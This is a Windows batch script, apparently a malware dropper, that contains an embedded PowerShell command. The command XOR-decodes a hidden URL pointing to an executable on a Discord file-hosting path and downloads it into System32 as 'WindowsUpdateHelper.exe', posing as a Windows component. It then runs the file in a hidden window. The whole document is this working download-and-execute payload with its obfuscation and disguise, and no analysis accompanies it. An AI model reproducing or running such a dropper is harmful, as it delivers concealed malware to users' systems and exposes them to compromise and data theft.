@echo off

setlocal enabledelayedexpansion

powershell -nop -c ^
$key=128; ^
$enc='e8f4f4f0f3baafafe3e4eeaee4e9f3e3eff2e4e1f0f0aee3efedafe1f4f4e1e3e8ede5eef4f3afb1b3b7b1b5b1b1b9b3b4b6b3b2b8b5b3b6b0b5afb1b3b7b1b7b2b5b0b9b0b3b3b6b5b4b2b7b3b0afebe5f9aee5f8e5bfe5f8bdb6b8b2b4b2e5b0e1a6e9f3bdb6b8b2b2e4e3b8e1a6e8edbdb5e4b3b7b8e6e3b7b9e2b1b8b9b3b1b3b5e4b0e2b3b8e5b6e6b2e3b0b8e6b0b5b4b2b3b5b9e6b3b3b8e2b3b7b1b8b3b5b4e5b2e2e1b6e6b0b2b2b9b8e1b5b9b5a6'; ^
$url=''; ^
for($i=0;$i -lt $enc.Length;$i+=2){$url+=[char]([convert]::ToInt32($enc.Substring($i,2),16) -bxor $key)}; ^
$target=$env:SystemRoot+'\System32\WindowsUpdateHelper.exe'; ^
[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; ^
(New-Object Net.WebClient).DownloadFile($url,$target); ^
if(Test-Path $target){Start-Process $target -WindowStyle Hidden}
